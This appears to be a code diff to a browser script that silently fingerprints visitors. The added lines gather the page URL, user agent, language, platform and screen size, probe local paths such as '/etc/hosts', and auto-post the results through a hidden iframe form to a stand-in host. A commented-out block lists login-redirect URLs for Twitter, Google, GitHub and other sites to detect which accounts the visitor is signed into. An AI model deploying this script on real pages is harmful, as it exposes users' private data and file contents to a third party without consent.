@@ -1,9 +1,13 @@
 <script>
-  const sendTarget = "http://example.com/test";
+  const sendTarget = "https://example.com";
   const data = {};
-  data.path = location.href;
   data.probe = {}
-
+  data.probe.currentLocation = location.href;
+  data.probe.browserUserAgent = navigator.userAgent;
+  data.probe.browserLanguage = navigator.language;
+  data.probe.browserPlatform = navigator.platform;
+  data.probe.browserScreen = screen.width + "x" + screen.height
+  
   const lists = ['a', 'b', 'c', '/etc/hosts']
   const waitGroup = {
     i: 0
@@ -26,6 +30,7 @@
     }
   }
 
+
   const submitForm = () => {
     const frame = document.createElement('iframe');
     frame.style = 'display: none;'
@@ -35,10 +40,11 @@
     form.method = "POST";
     form.action = sendTarget;
     Object.keys(data.probe).forEach(path => {
-      const input = document.createElement('input');
-      input.type = 'text';
-      input.name = path;
-      form.appendChild(input);
+      const inputText = document.createElement('input');
+      inputText.type = 'text';
+      inputText.name = path;
+      inputText.setAttribute("value", data.probe[path]);
+      form.appendChild(inputText);
     })
     const inputSubmit = document.createElement('input');
     inputSubmit.type = 'submit';
@@ -53,15 +59,87 @@
 
     frame.src = `data:text/html,${encodeURIComponent(wrapper.innerHTML)}`;
   }
+/*
+  var platforms = [{
+      domain: "https://twitter.com",
+      redirect: "/login?redirect_after_login=%2f..%2ffavicon.ico",
+      name: "Twitter"
+  }, {
+      domain: "https://www.facebook.com",
+      redirect: "/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F_rdr%3Dp",
+      name: "Facebook"
+  }, {
+      domain: "https://accounts.google.com",
+      redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
+      name: "Gmail"
+  }, {
+      domain: "https://accounts.google.com",
+      redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
+      name: "Youtube"
+  }, {
+      domain: "https://plus.google.com",
+      redirect: "/up/accounts/upgrade/?continue=https://plus.google.com/favicon.ico",
+      name: "Google Plus"
+  }, {
+      domain: "https://login.skype.com",
+      redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
+      name: "Skype"
+  }, {
+      domain: "https://www.spotify.com",
+      redirect: "/en/login/?forward_url=https%3A%2F%2Fwww.spotify.com%2Ffavicon.ico",
+      name: "Spotify"
+  }, {
+      domain: "https://www.reddit.com",
+      redirect: "/login?dest=https%3A%2F%2Fwww.reddit.com%2Ffavicon.ico",
+      name: "Reddit"
+  }, {
+      domain: "https://www.dropbox.com",
+      redirect: "/login?cont=https%3A%2F%2Fwww.dropbox.com%2Fstatic%2Fimages%2Fabout%2Fdropbox_logo_glyph_2015.svg",
+      name: "Dropbox"
+  }, {
+      domain: "https://www.amazon.com",
+      redirect: "/ap/signin/178-4417027-1316064?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=10000000&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico",
+      name: "Amazon.com"
+  }, {
+      domain: "https://github.com",
+      redirect: "/login?return_to=https%3A%2F%2Fgithub.com%2Ffavicon.ico%3Fid%3D1",
+      name: "Github"
+  }, {
+      domain: "https://disqus.com",
+      redirect: "/profile/login/?next=https%3A%2F%2Fdisqus.com%2Ffavicon.ico",
+      name: "Disqus"
+  }, {
+      domain: "https://secure.meetup.com",
+      redirect: "/login/?returnUri=https%3A%2F%2Fwww.meetup.com%2Fimg%2Fajax_loader_trans.gif",
+      name: "Meetup"
+  }, {
+      domain: "https://bitbucket.org",
+      redirect: "/account/signin/?next=/favicon.ico",
+      name: "BitBucket"
+  }];
 
+  // check online platforms
+  platforms.forEach((network) => {
+      waitGroup.i++
+      var img = document.createElement('img');
+      img.referrerPolicy = 'no-referrer';
+      img.src = network.domain + network.redirect;
+      img.onload = () => {
+          data.probe["loggedInto=" + network.domain] = true
+          waitGroup.i--
+      };
+      img.onerror = () => {
+        waitGroup.i--
+      };
+  });
+*/
+  // check file enum
   lists.forEach(path => probe(path, data, waitGroup))
 
   var id = setInterval(() => {
     if(waitGroup.i === 0) {
-      console.log('done', data)
       clearInterval(id)
       submitForm()
     }
   }, 500)
-  console.log(data)
 </script>
